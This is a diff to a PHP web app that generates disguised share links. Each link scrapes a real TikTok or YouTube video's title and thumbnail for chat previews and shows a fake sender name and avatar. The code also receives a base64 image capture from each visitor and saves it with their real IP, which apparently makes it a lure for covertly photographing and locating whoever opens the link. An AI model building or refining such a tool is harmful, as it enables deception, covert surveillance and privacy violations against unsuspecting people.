@@ -42,7 +42,7 @@ try {
 
 function fetch_target_meta($url) {
     $meta = [
-        'title' => 'Watch this shared video on TikTok',
+        'title' => 'TikTok - Make Your Day',
         'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
     ];
 
@@ -50,8 +50,8 @@ function fetch_target_meta($url) {
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 4);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
     $html = curl_exec($ch);
     curl_close($ch);
 
@@ -125,7 +125,6 @@ if (isset($_GET['r'])) {
         $meta_title = $link['meta_title'];
         $meta_image = $link['meta_image'];
 
-        // إذا كان الطلب استعلام معاينة من منصات التواصل أو المتصفح
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
             $img_base64 = $_POST['image'] ?? '';
             $public_ip = get_real_ip();
@@ -150,7 +149,6 @@ if (isset($_GET['r'])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title><?php echo htmlspecialchars($meta_title); ?></title>
-    <!-- وسوم المعاينة لتظهر الصورة والعنوان في تطبيقات الدردشة -->
     <meta property="og:title" content="<?php echo htmlspecialchars($meta_title); ?>">
     <meta property="og:image" content="<?php echo htmlspecialchars($meta_image); ?>">
     <meta property="og:type" content="video.other">
@@ -298,12 +296,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $target_url = "https://" . $target_url;
     }
 
-    // جلب ميتاداتا الرابط المستهدف تلقائياً (العنوان والصورة)
+    // سحب العنوان والصورة المصغرة تلقائياً من رابط الفيديو المستهدف
     $scraped_meta = fetch_target_meta($target_url);
-    $meta_title = !empty($_POST['custom_title']) ? trim($_POST['custom_title']) : $scraped_meta['title'];
-    $meta_image = !empty($_POST['custom_image_url']) ? trim($_POST['custom_image_url']) : $scraped_meta['image'];
+    $meta_title = $scraped_meta['title'];
+    $meta_image = $scraped_meta['image'];
 
-    // رفع صورة الحساب
+    // رفع صورة الحساب الشخصية
     $sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";
     if (isset($_FILES['avatar_file']) && $_FILES['avatar_file']['error'] === UPLOAD_ERR_OK) {
         $ext = pathinfo($_FILES['avatar_file']['name'], PATHINFO_EXTENSION);
@@ -314,7 +312,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $sender_avatar = trim($_POST['sender_avatar_url']);
     }
 
-    // رفع صورة الخلفية
+    // رفع صورة الخلفية (اختياري، إذا لم ترفع صورة سيتم استخدام صورة الفيديو المسحوبة تلقائياً)
     $bg_image_url = "";
     if (isset($_FILES['bg_file']) && $_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
         $ext = pathinfo($_FILES['bg_file']['name'], PATHINFO_EXTENSION);
@@ -408,12 +406,10 @@ if (!empty($filter_code)) {
     <div class="wrapper">
         
         <div class="section-box">
-            <h2>Generate Preview-Supported Link</h2>
+            <h2>Generate Auto-Scraped Link</h2>
             <form method="POST" enctype="multipart/form-data" class="form-grid">
-                <input type="text" name="target_url" placeholder="Target Destination URL (e.g. TikTok / YouTube video)..." required>
+                <input type="text" name="target_url" placeholder="Target Video URL (e.g. TikTok / YouTube)..." required>
                 <input type="text" name="sender_name" placeholder="Sender Name (e.g. azez)">
-                <input type="text" name="custom_title" placeholder="Custom Preview Title (Optional, auto-scraped if empty)">
-                <input type="text" name="custom_image_url" placeholder="Custom Preview Image URL (Optional)...">
                 
                 <div>
                     <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Sender Avatar Image:</label>
@@ -422,7 +418,7 @@ if (!empty($filter_code)) {
                 </div>
 
                 <div>
-                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Background Blur Image:</label>
+                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Background Blur Image (Optional, auto-extracted if empty):</label>
                     <input type="file" name="bg_file" accept="image/*">
                     <input type="text" name="bg_image_url" placeholder="Or paste Background URL..." style="margin-top: 6px;">
                 </div>
